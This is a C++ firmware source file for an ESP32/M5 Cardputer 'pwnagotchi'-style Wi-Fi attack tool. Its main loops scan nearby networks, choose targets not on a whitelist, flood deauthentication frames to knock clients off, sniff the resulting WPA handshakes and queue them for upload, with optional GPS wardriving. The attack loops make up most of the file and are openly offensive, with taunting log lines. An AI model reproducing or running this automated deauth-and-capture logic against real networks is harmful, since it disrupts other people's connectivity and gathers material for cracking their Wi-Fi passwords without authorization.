#include "settings.h"
#include "pwnagothi.h"
#include "WiFi.h"
#include "logger.h"
#include "ArduinoJson.h"
#include "mood.h"
#include "networkKit.h"
#include "EapolSniffer.h"
#include "ui.h"
#include <vector>
#include "pwngrid.h"
#include "api_client.h"
#include "wardrive.h"
#include "src.h"

bool pwnagothiModeEnabled;
bool pwnagothiScan = true;
bool nextWiFiCheck = false;

std::vector<wifiSpeedScan> g_speedScanResults;

const std::vector<wifiSpeedScan>& getSpeedScanResults() {
    return g_speedScanResults;
}


void speedScanCallback(void* buf, wifi_promiscuous_pkt_type_t type){
    if(type != WIFI_PKT_MGMT){
        return;
    }
    logMessage("Mgmt packet received in speedScanCallback");
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    
    if(pkt->rx_ctrl.sig_len < 36){ // minimal length for beacon frame
        logMessage("Packet too short to be a beacon frame.");
        return;
    }
    if ((pkt->payload[0] & 0xF0) != 0x80) return;  // 0x80 = beacon frame subtype


    int8_t rssi = pkt->rx_ctrl.rssi;
    uint8_t bssid[6];
    memcpy(bssid, pkt->payload + 10, 6);
    uint8_t channel = pkt->rx_ctrl.channel;
    // read channel from DS Parameter Set (tag 3) in the tagged parameters (fallback to radio channel)
    uint8_t ap_channel = channel;
    if (pkt->rx_ctrl.sig_len > 36) {
        int pos_ch = 36; // start of tagged parameters
        while (pos_ch + 2 <= pkt->rx_ctrl.sig_len - 1) {
            uint8_t tag = pkt->payload[pos_ch];
            uint8_t len = pkt->payload[pos_ch + 1];
            if (pos_ch + 2 + len > pkt->rx_ctrl.sig_len) break; // bounds check
            if (tag == 3 && len == 1) { // DS Parameter Set - current channel
                ap_channel = pkt->payload[pos_ch + 2];
                break;
            }
            pos_ch += 2 + len;
        }
    }
    channel = ap_channel;

    // capability info is at offsets 34..35 (fixed fields end at 36). privacy bit (0x0010) indicates security.
    uint16_t cap = (uint16_t)pkt->payload[34] | ((uint16_t)pkt->payload[35] << 8);
    bool secure = (cap & 0x0010) != 0;
    int ssid_len = pkt->payload[0x1F];
    String ssid = "";
    int pos = 36; // start of tagged parameters
    while (pos < pkt->rx_ctrl.sig_len - 2) {
        uint8_t tag = pkt->payload[pos];
        uint8_t len = pkt->payload[pos + 1];
        if (tag == 0 && len <= 32) { // SSID tag
            ssid = String((char*)(pkt->payload + pos + 2)).substring(0, len);
            break;
        }
        pos += 2 + len;
    }
    // Check for duplicates, then add if new to vector list
    for(auto &entry : g_speedScanResults){
        if(entry.ssid == ssid && entry.channel == channel){
            logMessage("Duplicate SSID detected: " + ssid + " on channel " + String(channel));
            return; // already exists
        }
    }
    g_speedScanResults.push_back({ssid, rssi, channel, secure, {bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]}});
}

void speedScan(){
    logMessage("Starting speed scan...");
    g_speedScanResults.clear();
    g_speedScanResults.shrink_to_fit();
    //go quickly through channels 1-13
    xSemaphoreTake(wifiMutex, portMAX_DELAY);
    esp_wifi_set_promiscuous_rx_cb(speedScanCallback);
    esp_wifi_set_promiscuous(true);
    for(int ch = 1; ch <= 13; ch++){
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        delay(120); // dwell time on each channel - adjust as needed
    }
    esp_wifi_set_promiscuous(false);
    xSemaphoreGive(wifiMutex);
    logMessage("Speed scan completed, found " + String(g_speedScanResults.size()) + " unique SSIDs.");
    
    for(auto &entry : g_speedScanResults){
        logMessage("SSID: " + entry.ssid + " | RSSI: " + String(entry.rssi) + " | Channel: " + String(entry.channel) + " | Secure: " + String(entry.secure));
    }
}


void speedScanTestAndPrintResults(){
    logMessage("Testing speed scan function...");
    long timeStart = millis();
    speedScan();
    logMessage("Speed scan results:");
    for(auto &entry : g_speedScanResults){
        logMessage("SSID: " + entry.ssid + " | RSSI: " + String(entry.rssi) + " | Channel: " + String(entry.channel) + " | Secure: " + String(entry.secure));
    }
    logMessage("Speed scan took " + String(millis() - timeStart) + " ms.");
    timeStart = millis();
    WiFi.scanNetworks();
    logMessage("Regular scan results: " + String(WiFi.scanComplete()) + " networks found.");
    for(int i = 0; i < WiFi.scanComplete(); i++){
        logMessage("SSID: " + WiFi.SSID(i) + " | RSSI: " + String(WiFi.RSSI(i)) + " | Channel: " + String(WiFi.channel(i)) + " | Secure: " + String(WiFi.encryptionType(i) != WIFI_AUTH_OPEN));
    }
    logMessage("Regular scan took " + String(millis() - timeStart) + " ms.");
}

bool pwnagothiBegin(){
    if(initPersonality() == false){
        logMessage("Personality init failed");
        return false;
    }
    if(!(wifion())){
        logMessage("WiFi init failed");
        return false;
    }
    allTimeDeauths = lastSessionDeauths;
    allSessionTime = lastSessionTime;
    allTimePeers = lastSessionPeers;
    lastSessionDeauths = 0;
    lastSessionCaptures = 0;
    lastSessionPeers = 0;
    lastSessionTime = 0;
    saveSettings();
    #ifndef BUTTON_ONLY_INPUT
    drawInfoBox("Waiting", "3 seconds to cancel", "Press ` to cancel", false, false);
    uint32_t start = millis();
    while(millis() - start < 3000){
        M5.update();
        M5Cardputer.update();
        auto status = M5Cardputer.Keyboard.keysState();
        for(auto i : status.word){
            if(i=='`'){
                debounceDelay();
                setMID();
                return false;
            }
        }
    }
    #else
    drawInfoBox("Waiting", "3 seconds to cancel", "Press any button to cancel", false, false);
    uint32_t start = millis();
    while(millis() - start < 3000){
        M5.update();
        inputManager::update();
        if(inputManager::isButtonAPressed() || inputManager::isButtonBPressed()){
            debounceDelay();
            setMID();
            return false;
        }
    }
    #endif
    logMessage("Pwnagothi auto mode init!");
    parseWhitelist();
    pwnagothiMode = true;
    xSemaphoreTake(wifiMutex, portMAX_DELAY);
    WiFi.disconnect(false, true);
    WiFi.mode(WIFI_STA);
    xSemaphoreGive(wifiMutex);
    wifion();
    return true;
}

// maximum entries we'll accept from the JSON whitelist to avoid OOM
static const size_t MAX_WHITELIST = 200;

std::vector<String> parseWhitelist() {
    JsonDocument doc;

    DeserializationError err = deserializeJson(doc, whitelist);
    if (err) {
        logMessage(String("Failed to parse whitelist JSON: ") + err.c_str());
        return std::vector<String>(); // empty vector
    }

    JsonArray arr = doc.as<JsonArray>();
    size_t actualSize = arr.size();
    if (actualSize > MAX_WHITELIST) {
        logMessage(String("Whitelist contains ") + String(actualSize)
                   + " entries; truncating to " + String(MAX_WHITELIST));
        actualSize = MAX_WHITELIST;
    }

    std::vector<String> result;
    result.reserve(actualSize); // reduce fragmentation / reallocation

    size_t i = 0;
    for (JsonVariant v : arr) {
        if (i++ >= actualSize) break;
        const char* s = v.as<const char*>();
        if (s) result.emplace_back(String(s));
        else result.emplace_back(String()); // keep index consistent
    }

    return result;
}

void addToWhitelist(const String &valueToAdd) {
    JsonDocument oldDoc;
    DeserializationError err = deserializeJson(oldDoc, whitelist);
    if (err) {
        // treat as empty array if parse fails
        oldDoc.to<JsonArray>();
    }

    JsonArray oldArr = oldDoc.as<JsonArray>();

    // make new doc sized for old + one more (rough estimate)
    JsonDocument newDoc;
    JsonArray newArr = newDoc.to<JsonArray>();

    size_t count = 0;
    for (JsonVariant v : oldArr) {
        if (count++ >= MAX_WHITELIST) break;
        newArr.add(v.as<const char*>());
    }

    if (count < MAX_WHITELIST) {
        newArr.add(valueToAdd.c_str());
    } else {
        logMessage("Whitelist at capacity, not adding: " + valueToAdd);
    }

    String out;
    serializeJson(newDoc, out);
    whitelist = out;
    saveSettings();
}

uint8_t wifiCheckInt = 0;

String lastBlocked = "";

void pwnagothiLoop(){
    if(pwnagothiScan){
        fLogMessage("Scan requested, current epoch state: %d happy epochs, %d sad epochs, total epochs: %d", tot_happy_epochs, tot_sad_epochs, allTimeEpochs);
        setMoodLooking(0);
        updateUi(true, false);
        g_speedScanResults.clear();
        // run promiscuous fast scan
        speedScan();
        if(!g_speedScanResults.empty()){
            wifiCheckInt = 0;
            pwnagothiScan = false;
            if(auto_mode_and_wardrive){
                wardrive(g_speedScanResults, pwnagotchi.gps_fix_timeout);
            }
            tot_happy_epochs = g_speedScanResults.size()/2;
            delay(pwnagotchi.delay_after_wifi_scan);
        } else {
            updateUi(true, false);
            WiFi.scanNetworks();
            delay(pwnagotchi.delay_after_no_networks_found);
            pwnagothiScan = true;
            allTimeEpochs++;
            return;
        }
    }
    else{
        // ensure we have results and index is in range
        printHeapInfo();
        if(g_speedScanResults.empty()){
            tot_sad_epochs++;
            logMessage("No speed-scan results available, scheduling new scan.");
            wifion();
            pwnagothiScan = true;
            allTimeEpochs++;
            return;
        }
        if(wifiCheckInt >= g_speedScanResults.size()){
            pwnagothiScan = true;
            allTimeEpochs++;
            return;
        }

        auto &entry = g_speedScanResults[wifiCheckInt];
        String attackVector = entry.ssid;
        if(attackVector == lastBlocked){
            logMessage("Skipping previously blocked SSID: " + attackVector);
            tot_sad_epochs++;
            wifiCheckInt++;
            allTimeEpochs++;
            return;
        }
        // handle empty SSID entry
        if(attackVector.length() == 0){
            logMessage("Encountered hidden/empty SSID, skipping.");
            wifiCheckInt++;
            return;
        }

        setIDLEMood();
        updateUi(true, false);
        delay(pwnagotchi.delay_after_picking_target);

        // whitelist check
        bool lopped = false;
        std::vector<String> whitelistParsed = parseWhitelist();
        for (size_t i = 0; i < whitelistParsed.size(); ++i) {
            logMessage("Whitelist check...");
            if ((whitelistParsed[i] == attackVector) && !lopped) {
                // safe -> skip
                lopped = true;
                lastBlocked = attackVector;
                wifiCheckInt++;
                tot_sad_epochs++;
                logMessage("SSID " + attackVector + " is in whitelist, skipping.");
                allTimeEpochs++;
                return;
            }
        }

        // prepare attack using speed-scan info
        if(setMac(&entry.bssid[0])){
            logMessage("Target MAC set to: " + attackVector);
        }
        else{
            logMessage("Failed to set target MAC for: " + attackVector);
            logMessage("Skipping to next target.");
            tot_sad_epochs++;
            wifiCheckInt++;
            allTimeEpochs++;
            return;
        }
        if(random(0, 10) >5){
            setMoodApSelected(attackVector);
        }
        else{
            setMoodToDeauth(attackVector);
        }
        updateUi(true, false);
        setTargetAP(&entry.bssid[0], attackVector);

        uint16_t targetChannel = entry.channel ? entry.channel : 1;
        if(pwnagotchi.activate_sniffer_on_deauth){
            SnifferBegin(targetChannel);
        }

        if(deauth_everyone(pwnagotchi.deauth_packets_sent, pwnagotchi.deauth_packet_delay)){
            logMessage("Deauth succesful, proceeding to sniff...");
            lastSessionDeauths++;
        }
        else{
            logMessage("Unknown error with deauth or deauth disabled!");
            if(!pwnagotchi.deauth_on){
                logMessage("Deauth disabled in settings, proceeding to sniff...");
            }
            else{
                pwnagothiScan = true;
                allTimeEpochs++;
                return;
            }
        }

        setMoodLooking(0);
        updateUi(true, false);
        unsigned long startTime1 = millis();

        if(!pwnagotchi.activate_sniffer_on_deauth){
            SnifferBegin(targetChannel);
        }

        while(true){
            SnifferLoop();
            delay(10);

            if (SnifferGetClientCount() > 0) {
                // ensure we consume pending packets
                while (SnifferPendingPackets() > 0) {
                    SnifferLoop();

                }
                setMoodToNewHandshake(1);;
                logMessage("Handshake captured for " + attackVector + "!");
                api_client::queueAPForUpload(attackVector, String(entry.bssid[0], HEX) + ":" + String(entry.bssid[1], HEX) + ":" + String(entry.bssid[2], HEX) + ":" + String(entry.bssid[3], HEX) + ":" + String(entry.bssid[4], HEX) + ":" + String(entry.bssid[5], HEX));
                if(getLocationAfterPwn){
                    wardrive(g_speedScanResults, pwnagotchi.gps_fix_timeout);
                }
                lastPwnedAP = attackVector;
                updateUi(true, false);
                trigger(1);
                SnifferEnd();
                trigger(2);
                //initPwngrid();
                trigger(3);
                pwned_ap++;
                sessionCaptures++;
                wifiCheckInt++;
                lastSessionPeers = getPwngridTotalPeers();
                lastSessionCaptures = sessionCaptures;
                lastSessionTime = millis();
                tot_happy_epochs += 3;
                if(pwnagotchi.sound_on_events){
                    Sound(1500, 100, true);
                    delay(100);
                    Sound(2000, 100, true);
                    delay(100);
                    Sound(2500, 150, true);
                    delay(150);
                }
                if(pwnagotchi.add_to_whitelist_on_success){
                    logMessage("Adding " + attackVector + " to whitelist");
                    addToWhitelist(attackVector);
                }
                else{
                    logMessage(attackVector + " not added to whitelist");
                }
                saveSettings();
                delay(pwnagotchi.delay_after_successful_attack);
                break;
            }
            if (millis() - startTime1 > pwnagotchi.handshake_wait_time) {
                logMessage("Timeout waiting for handshake from " + attackVector + ", moving on.");
                setMoodToAttackFailed(attackVector);
                SnifferEnd();
                initPwngrid();
                updateUi(true, false);

                delay(pwnagotchi.delay_after_attack_fail);
                if(pwnagotchi.add_to_whitelist_on_fail){
                    logMessage("Adding " + attackVector + " to whitelist");
                    addToWhitelist(attackVector);
                    saveSettings();
                }
                wifiCheckInt++;
                lastSessionPeers = getPwngridTotalPeers();
                lastSessionTime = millis();
                saveSettings();
                if(pwnagotchi.sound_on_events){
                    Sound(800, 150, true);
                    delay(150);
                    Sound(500, 150, true);
                    delay(150);
                    Sound(300, 200, true);
                    delay(200);
                }
                break;
            }
        }
    }

    setIDLEMood();
    updateUi(true, false);
    delay(pwnagotchi.nap_time);
    lastSessionPeers = getPwngridTotalPeers();
    lastSessionTime = millis();
    allTimeEpochs++;
    saveSettings();
}


void convert_normal_scan_to_speedscan(){
    g_speedScanResults.clear();
    int n = WiFi.scanComplete();
    for(int i = 0; i < n; i++){
        wifiSpeedScan entry;
        entry.ssid = WiFi.SSID(i);
        entry.rssi = WiFi.RSSI(i);
        entry.channel = WiFi.channel(i);
        entry.secure = WiFi.encryptionType(i) != WIFI_AUTH_OPEN;
        String bssidStr = WiFi.BSSIDstr(i);
        sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &entry.bssid[0], &entry.bssid[1], &entry.bssid[2], &entry.bssid[3], &entry.bssid[4], &entry.bssid[5]);
        g_speedScanResults.push_back(entry);
    }
}

void pwnagothiStealthLoop(){
    if(pwnagothiScan){
        fLogMessage("Scan requested, current epoch state: %d happy epochs, %d sad epochs, total epochs: %d", tot_happy_epochs, tot_sad_epochs, allTimeEpochs);
        setMoodLooking(0);
        updateUi(true, false);
        WiFi.scanNetworks();
        if((WiFi.scanComplete()) >= 0){
            wifiCheckInt = 0;
            pwnagothiScan = false;
            if(auto_mode_and_wardrive){
                g_speedScanResults.clear();
                convert_normal_scan_to_speedscan();
                wardrive(g_speedScanResults, pwnagotchi.gps_fix_timeout);
            }
            logMessage("Scan completed proceeding to attack!");
            setIDLEMood();
            updateUi(true, false);
            delay(pwnagotchi.delay_after_wifi_scan);
        }
    }
    else{
        setIDLEMood();
        updateUi(true, false);
        delay(pwnagotchi.delay_before_switching_target);
        String attackVector;
        if(!WiFi.SSID(0)){
            logMessage("No networks found. Waiting and retrying");
            tot_sad_epochs++;
            setMoodSad();
            updateUi(true, false);
            delay(pwnagotchi.delay_after_no_networks_found);
            pwnagothiScan = true;
            return;
        }
        if(wifiCheckInt < WiFi.scanComplete()){
            logMessage("Vector name filled: " + WiFi.SSID(wifiCheckInt));
        }
        else{
            pwnagothiScan = true;
            allTimeEpochs++;
            return;
        }
        attackVector = WiFi.SSID(wifiCheckInt);
        setIDLEMood();
        logMessage("Oh, hello " + attackVector + ", don't hide - I can still see you!!!");
        updateUi(true, false);
        delay(pwnagotchi.delay_after_picking_target);
        std::vector<String> whitelistParsed = parseWhitelist();
        for (size_t i = 0; i < whitelistParsed.size(); ++i) {
            logMessage("Whitelist check...");
            if (whitelistParsed[i] == attackVector) {
                logMessage("Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                tot_sad_epochs++;
                updateUi(true, false);
                wifiCheckInt++;
                allTimeEpochs++;
                return;
            }
        }
        setIDLEMood();
        logMessage("I'm looking inside you " + attackVector + "...");
        updateUi(true, false);
        set_target_channel(attackVector.c_str());
        uint8_t i = 0;
        uint8_t currentCount = SnifferGetClientCount();
        if(!setMac(WiFi.BSSID(wifiCheckInt))){
            logMessage("Failed to set target MAC for: " + attackVector);
            logMessage("Skipping to next target.");
            tot_sad_epochs++;
            wifiCheckInt++;
            allTimeEpochs++;
            return;
        }
        uint16_t targetChanel;
        uint8_t result = set_target_channel(attackVector.c_str());
        if (result != 0) {
            targetChanel = result;
        } else {
            pwnagothiScan = false;
            allTimeEpochs++;
            return;
        }
        initClientSniffing();
        String clients[50];
        int clientLen;
        unsigned long startTime = millis();
        logMessage("Waiting for clients to connect to " + attackVector);
        while(true){
            get_clients_list(clients, clientLen);
            if (millis() - startTime > pwnagotchi.client_discovery_timeout) {
                logMessage("Attack failed: Timeout waiting for client.");
                SnifferEnd();
                initPwngrid();
                tot_sad_epochs++;
                updateUi(true, false);
                delay(pwnagotchi.delay_after_no_clients_found);
                lastSessionPeers = getPwngridTotalPeers();
                lastSessionTime = millis();
                wifiCheckInt++;
                allTimeEpochs++;
                return;
            }
            if(!clients[i].isEmpty()){
                logMessage("Client count: " + String(clientLen));
                logMessage("I think that " + clients[i] + " doesn't need an internet...");
                logMessage("WiFi BSSID is: " + WiFi.BSSIDstr(wifiCheckInt));
                logMessage("Client BSSID is: "+ clients[clientLen]);
                updateUi(true, false);
                delay(pwnagotchi.delay_after_client_found);
                stopClientSniffing();
                break;
            }
            updateUi(true, false);
        }
        logMessage("Well, well, well  " + clients[i] + " you're OUT!!!");
        updateUi(true, false);
        setTargetAP(WiFi.BSSID(wifiCheckInt));
        if(pwnagotchi.activate_sniffer_on_deauth){
            SnifferBegin(targetChanel);
        }
        if(deauth_everyone(pwnagotchi.deauth_packets_sent, pwnagotchi.deauth_packet_delay) && (pwnagotchi.deauth_on)){
            logMessage("Deauth succesful, proceeding to sniff...");
            lastSessionDeauths++;
        }
        else{
            logMessage("Unknown error with deauth or deauth disabled!");
            if(!pwnagotchi.deauth_on){
                logMessage("Deauth disabled in settings, proceeding to sniff...");
            }
            else{
                allTimeEpochs++;
                pwnagothiScan = true;
                return;
            }
        }
        setMoodLooking(0);
        logMessage("Sniff, sniff... Looking for handshake...");
        updateUi(true, false);
        unsigned long startTime1 = millis();
        if(!pwnagotchi.activate_sniffer_on_deauth){
            SnifferBegin(targetChanel);
        }
        while(true){
            SnifferLoop();
            updateUi(true, false);
            delay(10);
            if (SnifferGetClientCount() > 0) {
                while (SnifferPendingPackets() > 0) {
                    SnifferLoop();
                    updateUi(true, false);
                }
                setMoodToNewHandshake(1);
                logMessage("Got new handshake!!!");
                api_client::queueAPForUpload(attackVector, String(WiFi.BSSIDstr(wifiCheckInt)));
                if(getLocationAfterPwn){
                    wardrive(g_speedScanResults, pwnagotchi.gps_fix_timeout);
                }
                lastPwnedAP = attackVector;
                updateUi(true, false);
                SnifferEnd();
                initPwngrid();
                pwned_ap++;
                sessionCaptures++;
                wifiCheckInt++;
                lastSessionPeers = getPwngridTotalPeers();
                lastSessionCaptures = sessionCaptures;
                lastSessionTime = millis();
                tot_happy_epochs += 3;
                if(pwnagotchi.sound_on_events){
                    Sound(1500, 100, true);
                    delay(100);
                    Sound(2000, 100, true);
                    delay(100);
                    Sound(2500, 150, true);
                    delay(150);
                }
                if(pwnagotchi.add_to_whitelist_on_success){
                    logMessage("Adding " + attackVector + " to whitelist");
                    addToWhitelist(attackVector);
                }
                else{
                    logMessage(attackVector + " not added to whitelist");
                }
                saveSettings();
                delay(pwnagotchi.delay_after_successful_attack);
                break;
            }
            if (millis() - startTime1 > pwnagotchi.handshake_wait_time) {
                setMoodToAttackFailed(attackVector);
                logMessage("Attack failed: Timeout waiting for handshake.");
                SnifferEnd();
                initPwngrid();
                updateUi(true, false);
                
                delay(pwnagotchi.delay_after_attack_fail);
                if(pwnagotchi.add_to_whitelist_on_fail){
                    logMessage("Adding " + attackVector + " to whitelist");
                    addToWhitelist(attackVector);
                    saveSettings();
                }
                wifiCheckInt++;
                lastSessionPeers = getPwngridTotalPeers();
                lastSessionTime = millis();
                saveSettings();
                if(pwnagotchi.sound_on_events){
                    Sound(800, 150, true);
                    delay(150);
                    Sound(500, 150, true);
                    delay(150);
                    Sound(300, 200, true);
                    delay(200);
                }
                break;
            }
        }
    }
    setIDLEMood();
    logMessage("Waiting " + String(pwnagotchi.nap_time/1000) + " seconds for next attack...");
    updateUi(true, false);
    lastSessionPeers = getPwngridTotalPeers();
    lastSessionTime = millis();
    allTimeEpochs++;
    saveSettings();
    delay(pwnagotchi.nap_time);
}

void removeItemFromWhitelist(String valueToRemove) {
    JsonDocument oldList;
    deserializeJson(oldList, whitelist);
    JsonDocument list;
    JsonArray array = list.to<JsonArray>();
    JsonArray oldArray = oldList.as<JsonArray>();
    
    for (JsonVariant v : oldArray) {
        String item = String(v.as<const char*>());
        if (item != valueToRemove) {
            array.add(item);
        }
    }
    
    String newWhitelist;
    serializeJson(list, newWhitelist);
    whitelist = newWhitelist;
    saveSettings();
}
